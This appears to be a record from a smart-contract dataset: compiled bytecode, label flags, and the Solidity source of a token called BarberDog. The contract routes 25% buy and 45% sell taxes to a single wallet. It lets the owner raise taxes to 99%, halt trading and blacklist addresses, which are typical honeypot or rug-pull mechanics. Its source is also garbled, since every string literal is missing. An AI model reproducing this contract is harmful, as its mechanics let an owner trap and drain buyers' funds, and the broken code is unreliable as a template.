cd60e51b815260040161052f91906115ab565b506000610ead84866117d5565b95945050505050565b6011546040516001600160a01b039091169082156108fc029083906000818181858888f19350505050158015610ef0573d6000803e3d6000fd5b5050565b6000600654821115610f5b5760405162461bcd60e51b815260206004820152602a60248201527f416d6f756e74206d757374206265206c657373207468616e20746f74616c207260448201526965666c656374696f6e7360b01b606482015260840161052f565b6000610f65611120565b9050610f718382611143565b9392505050565b6013805460ff60a81b1916600160a81b1790556040805160028082526060820183526000926020830190803683370190505090503081600081518110610fc057610fc06117e8565b6001600160a01b03928316602091820292909201810191909152601254604080516315ab88c960e31b81529051919093169263ad5c46489260048083019391928290030181865afa158015611019573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061103d91906117fe565b81600181518110611050576110506117e8565b6001600160a01b0392831660209182029290920101526012546110769130911684610899565b60125460405163791ac94760e01b81526001600160a01b039091169063791ac947906110af90859060009086903090429060040161181b565b600060405180830381600087803b1580156110c957600080fd5b505af11580156110dd573d6000803e3d6000fd5b50506013805460ff60a81b1916905550505050565b806110ff576110ff611185565b61110a8484846111b3565b806106d1576106d1600e54600c55600f54600d55565b600080600061112d6112aa565b909250905061113c8282611143565b9250505090565b6000610f7183836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008152506112ea565b600c541580156111955750600d54155b1561119c57565b600c8054600e55600d8054600f5560009182905555565b6000806000806000806111c587611318565b6001600160a01b038f16600090815260026020526040902054959b509399509197509550935091506111f79087611375565b6001600160a01b03808b1660009081526002602052604080822093909355908a168152205461122690866113b7565b6001600160a01b03891660009081526002602052604090205561124881611416565b6112528483611460565b876001600160a01b0316896001600160a01b03167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8560405161129791815260200190565b60405180910390a3505050505050505050565b600654600090819067016345785d8a00006112c58282611143565b8210156112e15750506006549267016345785d8a000092509050565b90939092509050565b6000818361130b5760405162461bcd60e51b815260040161052f91906115ab565b506000610ead84866117a0565b60008060008060008060008060006113358a600c54600d54611484565b9250925092506000611345611120565b905060008060006113588e8787876114d9565b919e509c509a509598509396509194505050505091939550919395565b6000610f7183836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f770000815250610e7c565b6000806113c483856117c2565b905083811015610f715760405162461bcd60e51b815260206004820152601b60248201527f536166654d6174683a206164646974696f6e206f766572666c6f770000000000604482015260640161052f565b6000611420611120565b9050600061142e8383611529565b3060009081526002602052604090205490915061144b90826113b7565b30600090815260026020526040902055505050565b60065461146d9083611375565b60065560075461147d90826113b7565b6007555050565b600080808061149e60646114988989611529565b90611143565b905060006114b160646114988a89611529565b905060006114c9826114c38b86611375565b90611375565b9992985090965090945050505050565b60008080806114e88886611529565b905060006114f68887611529565b905060006115048888611529565b90506000611516826114c38686611375565b939b939a50919850919650505050505050565b60008260000361153b57506000610496565b60006115478385611789565b90508261155485836117a0565b14610f715760405162461bcd60e51b815260206004820152602160248201527f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f6044820152607760f81b606482015260840161052f565b600060208083528351808285015260005b818110156115d8578581018301518582016040015282016115bc565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b038116811461066357600080fd5b6000806040838503121561162157600080fd5b823561162c816115f9565b946020939093013593505050565b60008060006060848603121561164f57600080fd5b833561165a816115f9565b9250602084013561166a816115f9565b929592945050506040919091013590565b60006020828403121561168d57600080fd5b81358015158114610f7157600080fd5b6000602082840312156116af57600080fd5b8135610f71816115f9565b6000602082840312156116cc57600080fd5b5035919050565b600080600080608085870312156116e957600080fd5b5050823594602084013594506040840135936060013592509050565b6000806040838503121561171857600080fd5b8235611723816115f9565b91506020830135611733816115f9565b809150509250929050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b808202811582820484141761049657610496611773565b6000826117bd57634e487b7160e01b600052601260045260246000fd5b500490565b8082018082111561049657610496611773565b8181038181111561049657610496611773565b634e487b7160e01b600052603260045260246000fd5b60006020828403121561181057600080fd5b8151610f71816115f9565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b8181101561186b5784516001600160a01b031683529383019391830191600101611846565b50506001600160a01b0396909616606085015250505060800152939250505056fe45524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e6365a2646970667358221220d122b3fed2ff24078edd8dc30e0fc7c3e515665584c3d41048c0871734b2841f64736f6c63430008130033,0,0,0,0,0,0,0,1,0,0,0,0,1,1,0,0,0
"pragma solidity ^0.8.9; abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }} interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );} contract Ownable is Context { address private _owner; address private _previousOwner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; } } library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }} interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);} interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );} contract BarberDog is Context, IERC20, Ownable { using SafeMath for uint256; string private constant _name = ; string private constant _symbol = ; uint8 private constant _decimals = 9; mapping(address => uint256) private _rOwned; mapping(address => uint256) private _tOwned; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => bool) private _isExcludedFromFee; uint256 private constant MAX = ~uint256(0); uint256 private constant _tTotal = 30000000 * 10**9; uint256 private _rTotal = (MAX - (MAX % _tTotal)); uint256 private _tFeeTotal; uint256 private _redisFeeOnBuy = 0; uint256 private _taxFeeOnBuy = 25; uint256 private _redisFeeOnSell = 0; uint256 private _taxFeeOnSell = 45; uint256 private _redisFee = _redisFeeOnSell; uint256 private _taxFee = _taxFeeOnSell; uint256 private _previousredisFee = _redisFee; uint256 private _previoustaxFee = _taxFee; mapping(address => bool) public bots; mapping (address => uint256) public _buyMap; address payable private _developmentAddress = payable(0x6a9A3736A23ca60951655B8ffe532F7278Fc82aF); address payable private _marketingAddress = payable(0x6a9A3736A23ca60951655B8ffe532F7278Fc82aF); IUniswapV2Router02 public uniswapV2Router; address public uniswapV2Pair; bool private tradingOpen = true; bool private inSwap = false; bool private swapEnabled = true; uint256 public _maxTxAmount = 300000 * 10**9; uint256 public _maxWalletSize = 300000 * 10**9; uint256 public _swapTokensAtAmount = 30000 * 10**9; event MaxTxAmountUpdated(uint256 _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } constructor() { _rOwned[_msgSender()] = _rTotal; IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH()); _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_developmentAddress] = true; _isExcludedFromFee[_marketingAddress] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public override returns (bool) { _transfer(sender, recipient, amount); _approve( sender, _msgSender(), _allowances[sender][_msgSender()].sub( amount, ) ); return true; } function tokenFromReflection(uint256 rAmount) private view returns (uint256) { require( rAmount <= _rTotal, ); uint256 currentRate = _getRate(); return rAmount.div(currentRate); } function removeAllFee() private { if (_redisFee == 0 && _taxFee == 0) return; _previousredisFee = _redisFee; _previoustaxFee = _taxFee; _redisFee = 0; _taxFee = 0; } function restoreAllFee() private { _redisFee = _previousredisFee; _taxFee = _previoustaxFee; } function _approve( address owner, address spender, uint256 amount ) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer( address from, address to, uint256 amount ) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if (from != owner() && to != owner()) { if (!tradingOpen) { require(from == owner(), ); } require(amount <= _maxTxAmount, ); require(!bots[from] && !bots[to], ); if(to != uniswapV2Pair) { require(balanceOf(to) + amount < _maxWalletSize, ); } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= _swapTokensAtAmount; if(contractTokenBalance >= _maxTxAmount) { contractTokenBalance = _maxTxAmount; } if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) { swapTokensForEth(contractTokenBalance); uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } bool takeFee = true; if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) { takeFee = false; } else { if(from == uniswapV2Pair && to != address(uniswapV2Router)) { _redisFee = _redisFeeOnBuy; _taxFee = _taxFeeOnBuy; } if (to == uniswapV2Pair && from != address(uniswapV2Router)) { _redisFee = _redisFeeOnSell; _taxFee = _taxFeeOnSell; } } _tokenTransfer(from, to, amount, takeFee); } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function sendETHToFee(uint256 amount) private { _marketingAddress.transfer(amount); } function setTrading(bool _tradingOpen) public onlyOwner { tradingOpen = _tradingOpen; } function manualswap() external { require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress); uint256 contractBalance = balanceOf(address(this)); swapTokensForEth(contractBalance); } function manualsend() external { require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress); uint256 contractETHBalance = address(this).balance; sendETHToFee(contractETHBalance); } function _tokenTransfer( address sender, address recipient, uint256 amount, bool takeFee ) private { if (!takeFee) removeAllFee(); _transferStandard(sender, recipient, amount); if (!takeFee) restoreAllFee(); } function _transferStandard( address sender, address recipient, uint256 tAmount ) private { ( uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam ) = _getValues(tAmount); _rOwned[sender] = _rOwned[sender].sub(rAmount); _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); _takeTeam(tTeam); _reflectFee(rFee, tFee); emit Transfer(sender, recipient, tTransferAmount); } function _takeTeam(uint256 tTeam) private { uint256 currentRate = _getRate(); uint256 rTeam = tTeam.mul(currentRate); _rOwned[address(this)] = _rOwned[address(this)].add(rTeam); } function _reflectFee(uint256 rFee, uint256 tFee) private { _rTotal = _rTotal.sub(rFee); _tFeeTotal = _tFeeTotal.add(tFee); } receive() external payable {} function _getValues(uint256 tAmount) private view returns ( uint256, uint256, uint256, uint256, uint256, uint256 ) { (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee); uint256 currentRate = _getRate(); (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate); return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam); } function _getTValues( uint256 tAmount, uint256 redisFee, uint256 taxFee ) private pure returns ( uint256, uint256, uint256 ) { uint256 tFee = tAmount.mul(redisFee).div(100); uint256 tTeam = tAmount.mul(taxFee).div(100); uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam); return (tTransferAmount, tFee, tTeam); } function _getRValues( uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate ) private pure returns ( uint256, uint256, uint256 ) { uint256 rAmount = tAmount.mul(currentRate); uint256 rFee = tFee.mul(currentRate); uint256 rTeam = tTeam.mul(currentRate); uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam); return (rAmount, rTransferAmount, rFee); } function _getRate() private view returns (uint256) { (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return rSupply.div(tSupply); } function _getCurrentSupply() private view returns (uint256, uint256) { uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply); } function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner { require(redisFeeOnBuy >= 0 && redisFeeOnBuy <= 0, ); require(taxFeeOnBuy >= 0 && taxFeeOnBuy <= 99, ); require(redisFeeOnSell >= 0 && redisFeeOnSell <= 0, ); require(taxFeeOnSell >= 0 && taxFeeOnSell <= 99, ); _redisFeeOnBuy = redisFeeOnBuy; _redisFeeOnSell = redisFeeOnSell; _taxFeeOnBuy = taxFeeOnBuy; _taxFeeOnSell = taxFeeOnSell; } function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner { _swapTokensAtAmount = swapTokensAtAmount; } function toggleSwap(bool _swapEnabled) public onlyOwner { swapEnabled = _swapEnabled; } function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner { require( maxTxAmount >= ((totalSupply() * 1) / 100), ); _maxTxAmount = maxTxAmount; } function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner { require( maxWalletSize >= ((totalSupply() * 1) / 100), ); _maxWalletSize = maxWalletSize; } function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner { for(uint256 i = 0; i < accounts.length; i++) { _isExcludedFromFee[accounts[i]] = excluded; } }}",0x6080604052600436106101bb5760003560e01c80637f2feddc116100ec578063a9059cbb1161008a578063c492f04611610064578063c492f046146105f5578063dd62ed3e1461061e578063ea1644d51461065b578063f2fde38b14610684576101c2565b8063a9059cbb14610564578063bfd79284146105a1578063c3c8cd80146105de576101c2565b80638f9a55c0116100c65780638f9a55c0146104bc57806395d89b41146104e757806398a5c31514610512578063a2a957bb1461053b576101c2565b80637f2feddc1461042b5780638da5cb5b146104685780638f70ccf714610493576101c2565b806349bd5a5e1161015957806370a082311161013357806370a0823114610383578063715018a6146103c057806374010ece146103d75780637d1db4a514610400576101c2565b806349bd5a5e146103185780636d8aa8f8146103435780636fc3eaec1461036c576101c2565b806318160ddd1161019557806318160ddd1461025a57806323b872dd146102855780632fd689e3146102c2578063313ce567146102ed576101c2565b806306fdde03146101c7578063095ea7b3146101f25780631694505e1461022f576101c2565b366101c257005b600080fd5b3480156101d357600080fd5b506101dc6106ad565b6040516101e99190612bbd565b60405180910390f35b3480156101fe57600080fd5b5061021960048036038101906102149190612c7d565b6106ea565b6040516102269190612cd8565b60405180910390f35b34801561023b57600080fd5b50610244610708565b6040516102519190612d52565b60405180910390f35b34801561026657600080fd5b5061026f61072e565b60405161027c9190612d7c565b60405180910390f35b34801561029157600080fd5b506102ac60048036038101906102a79190612d97565b61073d565b6040516102b99190612cd8565b60405180910390f35b3480156102ce57600080fd5b506102d7610816565b6040516102e49190612d7c565b60405180910390f35b3480156102f957600080fd5b5061030261081c565b60405161030f9190612e06565b60405180910390f35b34801561032457600080fd5b5061032d610825565b60405161033a9190612e30565b60405180910390f35b34801561034f57600080fd5b5061036a60048036038101906103659190612e77565b61084b565b005b34801561037857600080fd5b506103816108fd565b005b34801561038f57600080fd5b506103aa60048036038101906103a59190612ea4565b6109ce565b6040516103b79190612d7c565b60405180910390f35b3480156103cc57600080fd5b506103d5610a1f565b005b3480156103e357600080fd5b506103fe60048036038101906103f99190612ed1565b610b72565b005b34801561040c57600080fd5b50610415610c73565b6040516104229190612d7c565b60405180910390f35b34801561043757600080fd5b50610452600480360381019061044d9190612ea4565b610c79565b60405161045f9190612d7c565b60405180910390f35b34801561047457600080fd5b5061047d610c91565b60405161048a9190612e30565b60405180910390f35b34801561049f57600080fd5b506104ba60048036038101906104b59190612e77565b610cba565b005b3480156104c857600080fd5b506104d1610d6c565b6040516104de9190612d7c565b60405180910390f35b3480156104f357600080fd5b506104fc610d72565b6040516105099190612bbd565b60405180910390f35b34801561051e57600080fd5b5061053960048036038101906105349190612ed1565b610daf565b005b34801561054757600080fd5b50610562600480360381019061055d9190612efe565b610e4e565b005b34801561057057600080fd5b5061058b60048036038101906105869190612c7d565b611049565b6040516105989190612cd8565b60405180910390f35b3480156105ad57600080fd5b506105c860048036038101906105c39190612ea4565b611067565b6040516105d59190612cd8565b60405180910390f35b3480156105ea57600080fd5b506105f3611087565b005b34801561060157600080fd5b5061061c60048036038101906106179190612fca565b611160565b005b34801561062a57600080fd5b506106456004803603810190610640919061302a565b61129a565b6040516106529190612d7c565b60405180910390f35b34801561066757600080fd5b50610682600480360381019061067d9190612ed1565b611321565b005b34801561069057600080fd5b506106ab60048036038101906106a69190612ea4565b611422565b005b60606040518060400160405280600981526020017f426172626572446f670000000000000000000000000000000000000000000000815250905090565b60006106fe6106f76115e4565b84846115ec565b6001905092915050565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000666a94d74f430000905090565b600061074a8484846117b7565b61080b846107566115e4565b61080685604051806060016040528060288152602001613ec460289139600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006107bc6115e4565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461203c9092919063ffffffff16565b6115ec565b600190509392505050565b60185481565b60006009905090565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6108536115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146108e0576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108d7906130b6565b60405180910390fd5b80601560166101000a81548160ff02191690831515021790555050565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1661093e6115e4565b73ffffffffffffffffffffffffffffffffffffffff1614806109b45750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1661099c6115e4565b73ffffffffffffffffffffffffffffffffffffffff16145b6109bd57600080fd5b60004790506109cb816120a0565b50565b6000610a18600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205461210c565b9050919050565b610a276115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610ab4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610aab906130b6565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b610b7a6115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610c07576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bfe906130b6565b60405180910390fd5b60646001610c1361072e565b610c1d9190613105565b610c27919061318e565b811015610c69576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c6090613231565b60405180910390fd5b8060168190555050565b60165481565b60116020528060005260406000206000915090505481565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b610cc26115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610d4f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d46906130b6565b60405180910390fd5b80601560146101000a81548160ff02191690831515021790555050565b60175481565b60606040518060400160405280600781526020017f24426172446f6700000000000000000000000000000000000000000000000000815250905090565b610db76115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610e44576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e3b906130b6565b60405180910390fd5b8060188190555050565b610e566115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610ee3576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610eda906130b6565b60405180910390fd5b60008410158015610ef5575060008411155b610f34576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f2b9061329d565b60405180910390fd5b60008210158015610f46575060638211155b610f85576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f7c9061332f565b60405180910390fd5b60008310158015610f97575060008311155b610fd6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610fcd9061339b565b60405180910390fd5b60008110158015610fe8575060638111155b611027576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161101e9061342d565b60405180910390fd5b8360088190555082600a819055508160098190555080600b8190555050505050565b600061105d6110566115e4565b84846117b7565b6001905092915050565b60106020528060005260406000206000915054906101000a900460ff1681565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166110c86115e4565b73ffffffffffffffffffffffffffffffffffffffff16148061113e5750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166111266115e4565b73ffffffffffffffffffffffffffffffffffffffff16145b61114757600080fd5b6000611152306109ce565b905061115d8161217a565b50565b6111686115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146111f5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111ec906130b6565b60405180910390fd5b60005b8383905081101561129457816005600086868581811061121b5761121a61344d565b5b90506020020160208101906112309190612ea4565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff021916908315150217905550808061128c9061347c565b9150506111f8565b50505050565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6113296115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146113b6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113ad906130b6565b60405180910390fd5b606460016113c261072e565b6113cc9190613105565b6113d6919061318e565b811015611418576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161140f90613537565b60405180910390fd5b8060178190555050565b61142a6115e4565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146114b7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114ae906130b6565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415611527576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161151e906135c9565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16141561165c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016116539061365b565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156116cc576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016116c3906136ed565b60405180910390fd5b80600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516117aa9190612d7c565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611827576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161181e9061377f565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611897576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161188e90613811565b60405180910390fd5b600081116118da576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016118d1906138a3565b60405180910390fd5b6118e2610c91565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16141580156119505750611920610c91565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b15611d3b57601560149054906101000a900460ff166119df57611971610c91565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146119de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119d590613935565b60405180910390fd5b5b601654811115611a24576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611a1b906139a1565b60405180910390fd5b601060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16158015611ac85750601060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b611b07576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611afe90613a33565b60405180910390fd5b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611bb45760175481611b69846109ce565b611b739190613a53565b10611bb3576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611baa90613b1b565b60405180910390fd5b5b6000611bbf306109ce565b9050600060185482101590506016548210611bda5760165491505b808015611bf2575060158054906101000a900460ff16155b8015611c4c5750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b8015611c645750601560169054906101000a900460ff165b8015611cba5750600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b8015611d105750600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b15611d3857611d1e8261217a565b60004790506000811115611d3657611d35476120a0565b5b505b50505b600060019050600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1680611de25750600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b80611e955750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614158015611e945750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16837